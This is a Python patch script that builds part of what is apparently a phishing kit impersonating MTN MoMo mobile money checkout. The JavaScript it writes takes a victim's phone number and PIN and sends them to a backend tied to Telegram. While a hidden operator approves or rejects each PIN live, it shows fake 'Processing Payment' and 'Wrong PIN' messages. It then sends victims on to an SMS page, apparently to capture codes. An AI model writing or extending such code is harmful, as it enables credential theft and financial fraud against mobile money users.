#!/usr/bin/env python3
"""act17.py - Wire plan and checkout pages to the Telegram backend.

Four changes:
  1. backend/server.py - strip a leading "web/" prefix in the static
     handler so preview.html iframes keep working when served over
     HTTP (they point at web/index.html to also support file://).
  2. web/assets/js/pages/plans.js - POST /api/onboarding on tap,
     then navigate to checkout.html?plan=<code>&sid=<session_id>.
  3. web/checkout.html - give the loader card elements IDs, add an
     inline error slot for rejections.
  4. web/assets/js/pages/checkout.js - POST /api/checkout, poll
     /api/pin-status/<sid>, and either navigate to sms.html (approved)
     or surface a retry-able error (rejected).
"""
from __future__ import annotations

import logging
import subprocess
import sys
from pathlib import Path

SCRIPT_NAME = Path(__file__).name
TIMESTEP = 17

COMMIT_MESSAGE = """act17: wire plan and checkout pages to telegram

Patches backend/server.py to strip a leading web/ prefix so
preview.html iframes keep working when served over HTTP. Updates
pages/plans.js to POST /api/onboarding on plan tap and navigate with
&sid=<session_id>. Rewrites pages/checkout.js to POST /api/checkout,
poll /api/pin-status/<sid>, navigate to sms.html on approval, or
surface an inline error and clear the PIN on rejection. Adds loader
card IDs and an error slot to checkout.html."""


# --------------------------------------------------------------------- #
# backend/server.py (targeted patch)
# --------------------------------------------------------------------- #

SERVER_OLD = """\
        else:
            safe = path.lstrip("/")
            target = (WEB_ROOT / safe).resolve()
            try:
                target.relative_to(WEB_ROOT.resolve())
            except ValueError:
                return self._not_found()
"""

SERVER_NEW = """\
        else:
            safe = path.lstrip("/")
            # preview.html iframes point at "web/index.html" so the
            # preview also works when opened via file://. When served
            # over HTTP, strip the leading "web/" so both forms
            # resolve to the same file.
            if safe.startswith("web/"):
                safe = safe[len("web/"):]
            target = (WEB_ROOT / safe).resolve()
            try:
                target.relative_to(WEB_ROOT.resolve())
            except ValueError:
                return self._not_found()
"""


# --------------------------------------------------------------------- #
# web/assets/js/pages/plans.js (full rewrite)
# --------------------------------------------------------------------- #

PAGES_PLANS_JS = """\
/* ==========================================================================
   pages/plans.js
   Renders the plan cards on plans.html from window.Plans, then, when
   a plan is tapped:
     1. POST /api/onboarding with the plan code
     2. show the MoMo redirect loader
     3. navigate to checkout.html?plan=<code>&sid=<session_id>
   If the API call fails (e.g. the site was opened from file://),
   navigation still proceeds without a session id.
   ========================================================================== */

(function (global) {
  "use strict";

  var CONTAINER_ID = "plan-list";
  var LOADER_ID = "momo-loader";
  var CHECKOUT_PAGE = "checkout.html";
  var DEFAULT_DWELL_MS = 5000;
  var ONBOARDING_ENDPOINT = "/api/onboarding";

  /**
   * Show the MoMo redirect loader.
   */
  function showLoader() {
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  /**
   * Extract the plan code from a plan card href.
   * @param {string} href
   * @returns {string}
   */
  function planCodeFromHref(href) {
    var marker = "?plan=";
    var index = href.indexOf(marker);
    if (index === -1) {
      return "";
    }
    var tail = href.substring(index + marker.length);
    var amp = tail.indexOf("&");
    return amp === -1 ? tail : tail.substring(0, amp);
  }

  /**
   * Dwell time in ms, from Copy.loader.dwellMs if present.
   * @returns {number}
   */
  function dwellMs() {
    var configured = global.Copy &&
                     global.Copy.loader &&
                     global.Copy.loader.dwellMs;
    return typeof configured === "number" ? configured : DEFAULT_DWELL_MS;
  }

  /**
   * Navigate to *target* after the configured dwell.
   * @param {string} target
   */
  function navigateAfterDwell(target) {
    global.setTimeout(function () {
      global.location.href = target;
    }, dwellMs());
  }

  /**
   * Fire-and-forget onboarding ping. Resolves with session_id or "".
   * @param {string} planCode
   * @returns {Promise<string>}
   */
  function postOnboarding(planCode) {
    return global.fetch(ONBOARDING_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ plan_code: planCode })
    })
    .then(function (response) {
      return response.ok ? response.json() : { session_id: "" };
    })
    .then(function (data) {
      return typeof data.session_id === "string" ? data.session_id : "";
    })
    .catch(function () {
      return "";
    });
  }

  /**
   * Build the checkout URL for a plan, optionally with a session id.
   * @param {string} planCode
   * @param {string} sessionId
   * @returns {string}
   */
  function checkoutUrl(planCode, sessionId) {
    var base = CHECKOUT_PAGE + "?plan=" + encodeURIComponent(planCode);
    if (sessionId) {
      base += "&sid=" + encodeURIComponent(sessionId);
    }
    return base;
  }

  /**
   * Handle a click on a plan card.
   * @param {MouseEvent} event
   */
  function handlePlanClick(event) {
    event.preventDefault();
    var href = event.currentTarget.href;
    var planCode = planCodeFromHref(href);
    showLoader();
    postOnboarding(planCode).then(function (sessionId) {
      navigateAfterDwell(checkoutUrl(planCode, sessionId));
    });
  }

  /**
   * Build the anchor element for a single plan.
   * @param {Plan} plan
   * @returns {HTMLAnchorElement}
   */
  function buildPlanCard(plan) {
    var card = document.createElement("a");
    card.className = "card plan-card";
    card.href = CHECKOUT_PAGE + "?plan=" + encodeURIComponent(plan.code);
    card.setAttribute("aria-label",
      plan.name + ", " + plan.quotaLabel + ", " +
      global.Plans.formatPrice(plan) + " per " + plan.billingPeriod);

    var head = document.createElement("div");
    head.className = "plan-card__head";

    var name = document.createElement("h3");
    name.className = "plan-card__name";
    name.textContent = plan.name;

    var pill = document.createElement("span");
    pill.className = "pill";
    pill.textContent = plan.quotaLabel;

    head.appendChild(name);
    head.appendChild(pill);

    var desc = document.createElement("p");
    desc.className = "plan-card__desc";
    desc.textContent = plan.description;

    var price = document.createElement("p");
    price.className = "plan-card__price";
    price.textContent = global.Plans.formatPrice(plan);

    var period = document.createElement("span");
    period.className = "plan-card__price-period";
    period.textContent = "/" + plan.billingPeriod;
    price.appendChild(period);

    card.appendChild(head);
    card.appendChild(desc);
    card.appendChild(price);
    card.addEventListener("click", handlePlanClick);
    return card;
  }

  /**
   * Render all plans into the container element.
   */
  function render() {
    var container = document.getElementById(CONTAINER_ID);
    if (!container) {
      return;
    }
    container.textContent = "";
    global.Plans.all.forEach(function (plan) {
      container.appendChild(buildPlanCard(plan));
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", render);
  } else {
    render();
  }
})(window);
"""


# --------------------------------------------------------------------- #
# web/checkout.html (two targeted edits)
# --------------------------------------------------------------------- #

CHECKOUT_HTML_LOADER_OLD = """\
      <div class="loader-card" role="status" aria-live="polite">
        <div class="loader-spinner" aria-hidden="true"></div>
        <div class="loader-card__logo" aria-hidden="true">MoMo</div>
        <h2 class="loader-card__title">Processing Payment...</h2>
        <p class="loader-card__body">
          Verifying your payment with MTN MoMo
        </p>
        <p class="loader-card__footnote">Please do not refresh the page</p>
      </div>
"""

CHECKOUT_HTML_LOADER_NEW = """\
      <div class="loader-card" role="status" aria-live="polite">
        <div class="loader-spinner" aria-hidden="true"></div>
        <div class="loader-card__logo" aria-hidden="true">MoMo</div>
        <h2 class="loader-card__title" id="loader-title">Processing Payment...</h2>
        <p class="loader-card__body" id="loader-body">
          Verifying your payment with MTN MoMo
        </p>
        <p class="loader-card__footnote" id="loader-footnote">
          Please do not refresh the page
        </p>
      </div>
"""

CHECKOUT_HTML_BUTTON_OLD = """\
          <button type="button" class="btn btn--yellow"
                  id="confirm-payment" disabled>
"""

CHECKOUT_HTML_BUTTON_NEW = """\
          <div class="callout callout--warn" id="checkout-error"
               style="display:none;">
            <svg class="callout__icon" viewBox="0 0 24 24" fill="none"
                 stroke="currentColor" stroke-width="2"
                 stroke-linecap="round" stroke-linejoin="round"
                 aria-hidden="true">
              <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0Z"/>
              <line x1="12" y1="9" x2="12" y2="13"/>
              <line x1="12" y1="17" x2="12.01" y2="17"/>
            </svg>
            <span id="checkout-error-text">
              Wrong PIN, please try again.
            </span>
          </div>

          <button type="button" class="btn btn--yellow"
                  id="confirm-payment" disabled>
"""


# --------------------------------------------------------------------- #
# web/assets/js/pages/checkout.js (full rewrite)
# --------------------------------------------------------------------- #

PAGES_CHECKOUT_JS = """\
/* ==========================================================================
   pages/checkout.js
   Reads ?plan and ?sid, renders the MoMo amount, wires the 5-digit
   PIN and the phone input, and on Confirm Payment:
     1. POST /api/checkout  -> register the attempt with the operator
     2. show the loader     -> "Awaiting operator approval..."
     3. poll GET /api/pin-status/<sid> every 1.5s
        - approved -> navigate to sms.html?plan=<code>&phone=<phone>&sid=<sid>
        - rejected -> hide loader, show inline error, clear PIN, keep phone
        - timeout  -> hide loader, show inline error
   The phone number is prefilled on rejection; the PIN is cleared.
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var SMS_PAGE = "sms.html";
  var PIN_LENGTH = 5;
  var LOADER_ID = "payment-loader";
  var LOADER_TITLE_ID = "loader-title";
  var LOADER_BODY_ID = "loader-body";
  var LOADER_FOOTNOTE_ID = "loader-footnote";
  var ERROR_ID = "checkout-error";
  var ERROR_TEXT_ID = "checkout-error-text";

  var POLL_INTERVAL_MS = 1500;
  var POLL_MAX_ATTEMPTS = 200; // ~5 minutes

  var LOADER_TITLE_SENDING = "Sending...";
  var LOADER_BODY_SENDING = "Sending your details to the operator";
  var LOADER_TITLE_WAITING = "Awaiting Approval...";
  var LOADER_BODY_WAITING =
    "Waiting for the operator to verify your PIN. Please do not close this page.";
  var LOADER_FOOTNOTE = "Please do not refresh the page";

  var ERROR_REJECTED =
    "Wrong PIN, please try again.";
  var ERROR_TIMEOUT =
    "Still no response from the operator. Please try again.";
  var ERROR_NO_SESSION =
    "This checkout link is missing a session. " +
    "Please pick a plan again from the Plans page.";
  var ERROR_NETWORK =
    "Could not reach the server. Is 'py run_server.py' running?";

  /* ---------------------------------------------------------------- */
  /* URL helpers                                                      */
  /* ---------------------------------------------------------------- */

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function digitsOnly(value) {
    return (value || "").replace(/\\D+/g, "");
  }

  function formatLocalPhone(raw) {
    var digits = digitsOnly(raw);
    if (!digits) {
      return "";
    }
    return digits.charAt(0) === "0" ? digits : "0" + digits;
  }

  function resolvePlan() {
    var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
    return global.Plans.findByCode(code) ||
           global.Plans.findByCode(DEFAULT_PLAN_CODE);
  }

  /* ---------------------------------------------------------------- */
  /* DOM helpers                                                      */
  /* ---------------------------------------------------------------- */

  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) {
      el.textContent = value;
    }
  }

  function showLoader(title, body) {
    setText(LOADER_TITLE_ID, title);
    setText(LOADER_BODY_ID, body);
    setText(LOADER_FOOTNOTE_ID, LOADER_FOOTNOTE);
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  function hideLoader() {
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = true;
    }
  }

  function showError(message) {
    setText(ERROR_TEXT_ID, message);
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "flex";
    }
  }

  function hideError() {
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "none";
    }
  }

  function syncConfirmState(pinInput, button) {
    button.disabled = pinInput.value.length !== PIN_LENGTH;
  }

  /* ---------------------------------------------------------------- */
  /* API                                                              */
  /* ---------------------------------------------------------------- */

  function postCheckout(sessionId, phone, pin) {
    return global.fetch("/api/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sessionId,
        phone: phone,
        pin: pin
      })
    });
  }

  function getPinStatus(sessionId) {
    return global.fetch(
      "/api/pin-status/" + encodeURIComponent(sessionId)
    ).then(function (response) {
      return response.ok ? response.json() : { status: "unknown" };
    });
  }

  /**
   * Poll pin-status until approved, rejected, or timeout.
   * @param {string} sessionId
   * @param {{onApproved: Function, onRejected: Function, onTimeout: Function}} callbacks
   */
  function pollPinStatus(sessionId, callbacks) {
    var attempts = 0;

    function tick() {
      attempts += 1;
      if (attempts > POLL_MAX_ATTEMPTS) {
        callbacks.onTimeout();
        return;
      }
      getPinStatus(sessionId).then(function (data) {
        if (data.status === "approved") {
          callbacks.onApproved();
          return;
        }
        if (data.status === "rejected") {
          callbacks.onRejected();
          return;
        }
        global.setTimeout(tick, POLL_INTERVAL_MS);
      }).catch(function () {
        global.setTimeout(tick, POLL_INTERVAL_MS * 2);
      });
    }

    global.setTimeout(tick, POLL_INTERVAL_MS);
  }

  /* ---------------------------------------------------------------- */
  /* Flow                                                             */
  /* ---------------------------------------------------------------- */

  function navigateToSms(plan, phone, sessionId) {
    var target = SMS_PAGE +
      "?plan=" + encodeURIComponent(plan.code) +
      "&phone=" + encodeURIComponent(phone) +
      "&sid=" + encodeURIComponent(sessionId);
    global.location.href = target;
  }

  function wireForm(plan, sessionId) {
    var phoneInput = document.getElementById("phone");
    var pinInput = document.getElementById("pin");
    var confirmBtn = document.getElementById("confirm-payment");
    if (!phoneInput || !pinInput || !confirmBtn) {
      return;
    }

    phoneInput.addEventListener("input", function () {
      phoneInput.value = digitsOnly(phoneInput.value).slice(0, 9);
    });
    pinInput.addEventListener("input", function () {
      pinInput.value = digitsOnly(pinInput.value).slice(0, PIN_LENGTH);
      syncConfirmState(pinInput, confirmBtn);
    });

    confirmBtn.addEventListener("click", function () {
      hideError();
      var phone = formatLocalPhone(phoneInput.value);
      var pin = pinInput.value;
      if (phone.length < 9 || pin.length !== PIN_LENGTH) {
        showError("Enter a 9-digit phone number and a 5-digit PIN.");
        return;
      }

      showLoader(LOADER_TITLE_SENDING, LOADER_BODY_SENDING);

      postCheckout(sessionId, phone, pin).then(function (response) {
        if (!response.ok) {
          hideLoader();
          showError(ERROR_NETWORK);
          return;
        }
        showLoader(LOADER_TITLE_WAITING, LOADER_BODY_WAITING);
        pollPinStatus(sessionId, {
          onApproved: function () {
            navigateToSms(plan, phone, sessionId);
          },
          onRejected: function () {
            hideLoader();
            showError(ERROR_REJECTED);
            pinInput.value = "";
            syncConfirmState(pinInput, confirmBtn);
            pinInput.focus();
          },
          onTimeout: function () {
            hideLoader();
            showError(ERROR_TIMEOUT);
          }
        });
      }).catch(function () {
        hideLoader();
        showError(ERROR_NETWORK);
      });
    });

    syncConfirmState(pinInput, confirmBtn);
  }

  function init() {
    var plan = resolvePlan();
    var sessionId = getQueryParam("sid") || "";

    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }

    if (!sessionId) {
      showError(ERROR_NO_SESSION);
      return;
    }
    wireForm(plan, sessionId);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""


LOGGER = logging.getLogger(SCRIPT_NAME)


def project_root() -> Path:
    """Return the directory containing this script."""
    return Path(__file__).resolve().parent


def read_text(path: Path) -> str:
    """Return UTF-8 text, or '' if the file does not exist."""
    if not path.exists():
        return ""
    return path.read_text(encoding="utf-8")


def write_text(path: Path, text: str) -> None:
    """Write UTF-8 with LF endings."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def replace_once(path: Path, old: str, new: str) -> str:
    """Replace *old* with *new* once. Return a short status."""
    text = read_text(path)
    if not text:
        return "missing-file"
    if old not in text:
        if new in text:
            return "already"
        return "no-match"
    write_text(path, text.replace(old, new, 1))
    return "replaced"


def run_git(root: Path, *args: str) -> subprocess.CompletedProcess[str]:
    """Run git in *root*; never raises. Decodes output as UTF-8."""
    return subprocess.run(
        ["git", *args],
        cwd=root,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )


def main() -> int:
    """Apply the four edits and commit."""
    logging.basicConfig(
        level=logging.INFO, format="%(message)s", stream=sys.stdout
    )
    root = project_root()

    LOGGER.info("%s - timestep %d starting", SCRIPT_NAME, TIMESTEP)

    # 1. server.py patch
    server_py = root / "backend" / "server.py"
    LOGGER.info("[%s] %s (web/ prefix strip)",
                replace_once(server_py, SERVER_OLD, SERVER_NEW),
                server_py.relative_to(root))

    # 2. plans.js rewrite
    plans_js = root / "web" / "assets" / "js" / "pages" / "plans.js"
    write_text(plans_js, PAGES_PLANS_JS)
    LOGGER.info("[written] %s", plans_js.relative_to(root))

    # 3. checkout.html: two targeted edits
    checkout_html = root / "web" / "checkout.html"
    LOGGER.info("[%s] %s (loader IDs)",
                replace_once(checkout_html, CHECKOUT_HTML_LOADER_OLD,
                             CHECKOUT_HTML_LOADER_NEW),
                checkout_html.relative_to(root))
    LOGGER.info("[%s] %s (error slot)",
                replace_once(checkout_html, CHECKOUT_HTML_BUTTON_OLD,
                             CHECKOUT_HTML_BUTTON_NEW),
                checkout_html.relative_to(root))

    # 4. checkout.js rewrite
    checkout_js = root / "web" / "assets" / "js" / "pages" / "checkout.js"
    write_text(checkout_js, PAGES_CHECKOUT_JS)
    LOGGER.info("[written] %s", checkout_js.relative_to(root))

    # Commit
    add = run_git(root, "add", "-A")
    if add.returncode != 0:
        LOGGER.error("git add failed: %s", add.stderr.strip())
        return 1

    commit = run_git(root, "commit", "-m", COMMIT_MESSAGE)
    if commit.returncode != 0:
        LOGGER.error("git commit failed: %s", commit.stderr.strip())
        return 1

    head = run_git(root, "log", "-n", "1", "--oneline")
    LOGGER.info("HEAD is now: %s", head.stdout.strip())
    LOGGER.info("")
    LOGGER.info("Restart the server so the static handler patch takes")
    LOGGER.info("effect, then open:")
    LOGGER.info("    http://127.0.0.1:8000/preview.html")
    LOGGER.info("%s - done", SCRIPT_NAME)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())